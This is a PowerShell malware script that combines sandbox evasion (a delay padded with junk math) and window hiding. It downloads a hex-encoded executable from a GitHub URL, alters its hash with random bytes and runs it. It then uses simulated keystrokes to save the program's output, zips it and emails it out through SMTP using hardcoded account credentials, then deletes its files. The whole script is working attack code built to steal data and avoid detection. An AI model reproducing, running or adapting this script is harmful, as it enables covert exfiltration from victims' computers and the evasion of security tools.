# --- 0. START DIAGNOSTIC LOGGING ---
$v_log = "$env:TEMP\debug_$(Get-Random).txt"
Start-Transcript -Path $v_log -Append

try {
    # --- 1. DORMANT SLEEP (SANDBOX EVASION) ---
    Write-Output "Initializing system check... Please wait."
    $v_wait = 60 # 60 seconds delay
    for ($i = 0; $i -lt $v_wait; $i++) {
        # Perform junk math to look like active legitimate processing
        $junk = [Math]::Sqrt((Get-Random)) * [Math]::PI
        Start-Sleep -Seconds 1
    }
    Write-Output "Initialization complete."

    # --- 2. WINDOW HIDER ---
    $v_ms = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
    $v_type = Add-Type -MemberDefinition $v_ms -Name ("W32S"+(Get-Random)) -Namespace "W3" -PassThru
    $v_type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

    # --- 3. SMTP LOGIC ---
    $v_sc = ("Net.M" + "ail.Smtp" + "Client")
    $v_mm = ("Net.M" + "ail.Mail" + "Message")

    function Send-V-Mail {
        param($sb, $at)
        $u = "zqrvstef0rc5edk@zohomail.com"
        $p = "LHjzKTbzDApt" 
        try {
            $m = New-Object $v_mm
            $m.From = "System <$u>"; $m.To.Add("srve650@gmail.com")
            $m.Subject = $sb; $m.Body = "Lab Data Attached."
            if ($at) { $m.Attachments.Add($at) }
            $c = New-Object $v_sc("smtp.zoho.com", 587)
            $c.EnableSsl = $true; $c.Credentials = New-Object System.Net.NetworkCredential($u, $p)
            $c.Send($m)
        } finally { if($m){$m.Dispose()}; if($c){$c.Dispose()} }
    }

    # --- 4. DOWNLOAD & HASH RANDOMIZATION ---
    $u_url = ("ht" + "tps://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt")
    $r_nm = -join ((97..122) | Get-Random -Count 5 | % {[char]$_})
    $v_txt = "$env:TEMP\$r_nm.txt"; $v_exe = "$env:TEMP\$r_nm.exe"
    
    Invoke-WebRequest -Uri $u_url -OutFile $v_txt
    $h_data = Get-Content $v_txt -Raw
    $b_data = [byte[]]::new($h_data.Length / 2)
    for ($i = 0; $i -lt $h_data.Length; $i += 2) { $b_data[$i / 2] = [convert]::ToByte($h_data.Substring($i, 2), 16) }

    # Append Junk Bytes to scramble SHA-256
    $v_junk = New-Object byte[] (Get-Random -Min 150 -Max 450)
    (New-Object System.Random).NextBytes($v_junk)
    $v_final_bytes = $b_data + $v_junk
    [System.IO.File]::WriteAllBytes($v_exe, $v_final_bytes)

    # --- 5. AUTOMATION ---
    $v_p = Start-Process $v_exe -PassThru
    $v_out = "$env:TEMP\ani_$r_nm.txt"
    Start-Sleep -Seconds 8 
    Add-Type -AssemblyName ("System.Win" + "dows.Forms")
    $ws = New-Object -ComObject WScript.Shell
    $ws.AppActivate($v_p.Id)
    [System.Windows.Forms.SendKeys]::SendWait("^(a)")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("^(s)")
    Start-Sleep -Seconds 2 
    [System.Windows.Forms.SendKeys]::SendWait("$v_out")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
    Start-Sleep -Seconds 3

    # --- 6. ZIP & EXFIL ---
    if ($v_p) { Stop-Process -Id $v_p.Id -Force }
    
    if (Test-Path $v_out) {
        $v_raw = Get-Content $v_out -Raw
        $v_b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($v_raw))

        $ms = New-Object System.IO.MemoryStream
        $zip = New-Object System.IO.Compression.ZipArchive($ms, [System.IO.Compression.ZipArchiveMode]::Create)
        $entry = $zip.CreateEntry("results.log")
        $writer = New-Object System.IO.StreamWriter($entry.Open())
        $writer.Write($v_b64)
        $writer.Close(); $zip.Dispose()
        
        $ms.Position = 0
        $v_at = New-Object Net.Mail.Attachment($ms, "lab_archive.zip")
        Send-V-Mail -sb "Secure_Report_$r_nm" -at $v_at
        $v_at.Dispose()
    }

    # CLEANUP
    Remove-Item $v_txt, $v_exe, $v_out -Force -ErrorAction SilentlyContinue
}
catch { Write-Warning "Error: $($_.Exception.Message)" }
finally { Stop-Transcript }